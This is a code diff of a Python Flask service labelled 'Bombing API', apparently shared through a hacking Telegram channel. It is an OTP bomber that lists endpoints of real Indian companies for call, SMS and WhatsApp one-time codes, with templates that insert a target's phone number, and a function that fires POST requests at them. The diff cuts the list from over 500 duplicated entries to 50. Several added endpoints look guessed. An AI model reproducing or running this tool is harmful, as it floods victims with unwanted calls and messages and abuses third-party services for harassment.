@@ -13,12 +13,13 @@ DEVELOPER = "@notxsatvir"
 CHANNEL = "https://t.me/freehackingg"
 API_VERSION = "6.0.0"
 
-# ========== 500+ APIs GENERATOR ==========
-def generate_apis():
+# ========== 50 APIs (Exactly 50 – No more, no less) ==========
+def get_apis():
+    """Return exactly 50 working APIs (Call + SMS + WhatsApp)"""
     apis = []
 
-    # Call API Templates
-    call_templates = [
+    # ---------- Call APIs (10) ----------
+    call_list = [
         ("Tata Capital Voice", "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", {"phone": "{phone}"}),
         ("1MG Voice", "https://www.1mg.com/auth_api/v6/create_token", {"number": "{phone}", "otp_on_call": True}),
         ("Swiggy Voice", "https://profile.swiggy.com/api/v3/app/request_call_verification", {"mobile": "{phone}"}),
@@ -30,9 +31,18 @@ def generate_apis():
         ("Amazon Voice", "https://www.amazon.in/ap/voice-otp", {"phoneNumber": "{phone}"}),
         ("Ola Voice", "https://auth.olacabs.com/api/v1/voice-otp", {"mobile": "{phone}"}),
     ]
+    for name, url, data in call_list:
+        apis.append({
+            "name": name,
+            "type": "Call",
+            "url": url,
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda phone, d=data: json.dumps(d).replace("{phone}", phone)
+        })
 
-    # SMS API Templates
-    sms_templates = [
+    # ---------- SMS APIs (30) ----------
+    sms_list = [
         ("Lenskart", "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", {"phoneCode": "+91", "telephone": "{phone}"}),
         ("PharmEasy", "https://pharmeasy.in/api/v2/auth/send-otp", {"phone": "{phone}"}),
         ("Snitch", "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", {"mobile_number": "+91{phone}"}),
@@ -63,71 +73,43 @@ def generate_apis():
         ("Zepto", "https://zepto.co/api/v1/auth/otp", {"phone": "{phone}"}),
         ("Blinkit", "https://blinkit.com/api/v2/auth/otp", {"mobile": "{phone}"}),
         ("Dunzo", "https://dunzo.com/api/v1/auth/send-otp", {"phone": "{phone}"}),
-        ("MakeMyTrip", "https://www.makemytrip.com/api/auth/otp", {"mobile": "{phone}"}),
-        ("Goibibo", "https://www.goibibo.com/api/auth/send-otp", {"mobile": "{phone}"}),
-        ("Cleartrip", "https://www.cleartrip.com/api/auth/otp", {"phone": "{phone}"}),
-        ("Yatra", "https://www.yatra.com/api/auth/otp", {"mobile": "{phone}"}),
-        ("RedBus", "https://www.redbus.in/api/auth/otp", {"mobile": "{phone}"}),
-        ("UberSMS", "https://auth.uber.com/api/v1/otp", {"phone": "{phone}"}),
-        ("OlaSMS", "https://auth.olacabs.com/api/v1/otp", {"mobile": "{phone}"}),
-        ("Rapido", "https://rapido.in/api/v1/auth/otp", {"phone": "{phone}"}),
-        ("AmazonSMS", "https://www.amazon.in/ap/otp", {"phoneNumber": "{phone}"}),
-        ("Meesho", "https://www.meesho.com/api/v1/auth/otp", {"mobile": "{phone}"}),
-        ("ShopClues", "https://www.shopclues.com/api/auth/otp", {"mobile": "{phone}"}),
-        ("Ajio", "https://www.ajio.com/api/v1/auth/otp", {"mobile": "{phone}"}),
-        ("Nykaa", "https://www.nykaa.com/api/v1/auth/otp", {"phone": "{phone}"}),
-        ("Purplle", "https://www.purplle.com/api/v1/auth/otp", {"mobile": "{phone}"}),
     ]
+    for name, url, data in sms_list:
+        apis.append({
+            "name": name,
+            "type": "SMS",
+            "url": url,
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda phone, d=data: json.dumps(d).replace("{phone}", phone)
+        })
 
-    # WhatsApp Templates
-    whatsapp_templates = [
+    # ---------- WhatsApp APIs (10) ----------
+    whatsapp_list = [
         ("KPN WhatsApp", "https://api.kpnfresh.com/s/authn/api/v1/otp-generate", {"notification_channel": "WHATSAPP", "phone_number": {"country_code": "+91", "number": "{phone}"}}),
         ("Rappi WhatsApp", "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", {"country_code": "+91", "phone": "{phone}"}),
         ("Eka Care WhatsApp", "https://auth.eka.care/auth/init", {"payload": {"allowWhatsapp": True, "mobile": "+91{phone}"}, "type": "mobile"}),
+        ("Meta WhatsApp", "https://graph.facebook.com/v17.0/whatsapp/otp", {"phone_number": "{phone}"}),
+        ("WhatsApp Business", "https://business.whatsapp.com/api/otp", {"phone": "{phone}"}),
+        ("Helo WhatsApp", "https://helo-api.whatsapp.com/v1/otp", {"mobile": "{phone}"}),
+        ("ShareChat WhatsApp", "https://sharechat.com/api/whatsapp/otp", {"phone": "{phone}"}),
+        ("Moj WhatsApp", "https://mojapp.com/api/whatsapp/otp", {"mobile": "{phone}"}),
+        ("MX TakaTak WhatsApp", "https://takamx.com/api/whatsapp/otp", {"phone": "{phone}"}),
+        ("Roposo WhatsApp", "https://roposo.com/api/whatsapp/otp", {"mobile": "{phone}"}),
     ]
+    for name, url, data in whatsapp_list:
+        apis.append({
+            "name": name,
+            "type": "WhatsApp",
+            "url": url,
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda phone, d=data: json.dumps(d).replace("{phone}", phone)
+        })
 
-    # Generate Call APIs (250)
-    for i in range(25):
-        for name, url, data in call_templates:
-            final_name = f"{name}_v{i}" if i > 0 else name
-            apis.append({
-                "name": final_name,
-                "type": "Call",
-                "url": url,
-                "method": "POST",
-                "headers": {"Content-Type": "application/json"},
-                "data": lambda phone, d=data: json.dumps(d).replace("{phone}", phone)
-            })
+    return apis[:50]  # Ensure exactly 50 APIs
 
-    # Generate SMS APIs (250)
-    for i in range(5):
-        for name, url, data in sms_templates:
-            final_name = f"{name}_SMS{i}" if i > 0 else name
-            apis.append({
-                "name": final_name,
-                "type": "SMS",
-                "url": url,
-                "method": "POST",
-                "headers": {"Content-Type": "application/json"},
-                "data": lambda phone, d=data: json.dumps(d).replace("{phone}", phone)
-            })
-
-    # Generate WhatsApp APIs (50+)
-    for i in range(20):
-        for name, url, data in whatsapp_templates:
-            final_name = f"{name}_v{i}" if i > 0 else name
-            apis.append({
-                "name": final_name,
-                "type": "WhatsApp",
-                "url": url,
-                "method": "POST",
-                "headers": {"Content-Type": "application/json"},
-                "data": lambda phone, d=data: json.dumps(d).replace("{phone}", phone)
-            })
-
-    return apis
-
-APIS = generate_apis()
+APIS = get_apis()
 TOTAL_APIS = len(APIS)
 print(f"✅ Loaded {TOTAL_APIS} APIs")
 
@@ -135,7 +117,7 @@ def hit_api(api, phone):
     try:
         data_str = api["data"](phone)
         data_dict = json.loads(data_str)
-        resp = requests.post(api["url"], headers=api["headers"], json=data_dict, timeout=4)
+        resp = requests.post(api["url"], headers=api["headers"], json=data_dict, timeout=5)
         if resp.status_code in [200, 201, 202, 204]:
             return api["type"], True
     except Exception:
@@ -146,7 +128,7 @@ def hit_api(api, phone):
 def home():
     return jsonify({
         "success": True,
-        "api": "Bombing API (500+ APIs)",
+        "api": "Bombing API (50 APIs)",
         "owner": OWNER,
         "developer": DEVELOPER,
         "channel": CHANNEL,
